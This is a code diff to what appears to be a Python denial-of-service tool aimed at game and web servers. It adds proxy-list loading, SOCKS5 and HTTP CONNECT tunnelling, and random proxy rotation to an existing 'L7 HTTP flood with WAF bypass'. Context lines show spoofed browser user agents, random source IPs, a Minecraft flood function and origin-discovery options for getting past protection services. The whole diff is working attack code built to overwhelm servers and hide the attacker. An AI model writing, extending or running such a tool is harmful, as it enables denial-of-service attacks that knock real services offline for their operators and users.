@@ -49,6 +49,86 @@ SPOOFED_UAS = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
 ]
 
+
+# ============================================================
+#  PROXY SUPPORT
+# ============================================================
+PROXIES = []
+
+def load_proxies(path):
+    """Load proxies from file. Supports: IP:PORT, user:pass@IP:PORT, socks5://IP:PORT, http://IP:PORT"""
+    global PROXIES
+    PROXIES = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            PROXIES.append(line)
+    print(f"[*] Loaded {len(PROXIES)} proxies")
+    return PROXIES
+
+def get_proxy():
+    """Get a random proxy from the pool."""
+    if not PROXIES:
+        return None
+    return random.choice(PROXIES)
+
+def parse_proxy(proxy_str):
+    """Parse proxy string into (type, host, port, user, pass)."""
+    ptype = "http"
+    if "://" in proxy_str:
+        ptype, proxy_str = proxy_str.split("://", 1)
+    auth = None
+    if "@" in proxy_str:
+        auth, proxy_str = proxy_str.rsplit("@", 1)
+    host, port = proxy_str.rsplit(":", 1)
+    user, passwd = (auth.split(":", 1) if auth else (None, None))
+    return ptype, host, int(port), user, passwd
+
+async def proxy_connect(host, port, use_ssl, proxy_str, timeout=10):
+    """Connect through a proxy (HTTP CONNECT or SOCKS5)."""
+    ptype, phost, pport, puser, ppass = parse_proxy(proxy_str)
+    # connect to proxy
+    reader, writer = await asyncio.wait_for(
+        asyncio.open_connection(phost, pport), timeout=timeout)
+    if ptype == "socks5":
+        # SOCKS5 handshake
+        writer.write(b"\x05\x01\x00")
+        await writer.drain()
+        resp = await reader.read(2)
+        if resp != b"\x05\x00":
+            raise Exception("SOCKS5 auth failed")
+        # connect request
+        writer.write(b"\x05\x01\x00\x01" + socket.inet_aton(host) + struct.pack(">H", port))
+        await writer.drain()
+        resp = await reader.read(10)
+        if resp[1] != 0:
+            raise Exception("SOCKS5 connect failed")
+    else:
+        # HTTP CONNECT
+        connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n"
+        if puser:
+            import base64
+            creds = base64.b64encode(f"{puser}:{ppass}".encode()).decode()
+            connect_req += f"Proxy-Authorization: Basic {creds}\r\n"
+        connect_req += "\r\n"
+        writer.write(connect_req.encode())
+        await writer.drain()
+        # read response
+        resp = await asyncio.wait_for(reader.read(1024), timeout=timeout)
+        if b"200" not in resp.split(b"\r\n")[0]:
+            raise Exception(f"HTTP CONNECT failed: {resp.split(b'\\r\\n')[0]}")
+    # wrap in SSL if needed
+    if use_ssl:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        writer = ctx.wrap_socket(writer, server_hostname=host, do_handshake_on_connect=False)
+        await writer.do_handshake()
+    return reader, writer
+
+
 def rnd_ip():
     return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
 
@@ -506,15 +586,19 @@ async def mc_flood(host, port, duration, conns):
     await asyncio.gather(*[one() for _ in range(conns)])
 
 async def l7_flood(host, port, duration, conns, use_ssl=False):
-    """L7 HTTP flood with WAF bypass."""
+    """L7 HTTP flood with WAF bypass + proxy rotation."""
     end = time.time() + duration
-    ctx = None
-    if use_ssl:
-        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
     async def one():
         while time.time() < end:
             try:
-                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
+                proxy = get_proxy()
+                if proxy:
+                    r, w = await proxy_connect(host, port, use_ssl, proxy)
+                else:
+                    ctx = None
+                    if use_ssl:
+                        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+                    r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                 h = spoofed_headers()
                 p = f"/?r={random.randint(0,999999)}"
                 req = f"GET {p} HTTP/1.1\r\nHost: {host}\r\n"
@@ -548,10 +632,13 @@ async def main():
     ap.add_argument("--discover", action="store_true", help="discover origin only")
     ap.add_argument("--dynmap", action="store_true", help="check for Dynmap/BlueMap leak")
     ap.add_argument("--confirm", action="store_true")
+    ap.add_argument("--proxies", help="file with proxy list (IP:PORT or user:pass@IP:PORT)")
     args = ap.parse_args()
 
     if not args.confirm and not args.discover and not args.dynmap:
         print("refusing: pass --confirm (or --discover/--dynmap)"); return
+    if args.proxies:
+        load_proxies(args.proxies)
 
     port = args.port
     if args.ssl and port == 80:
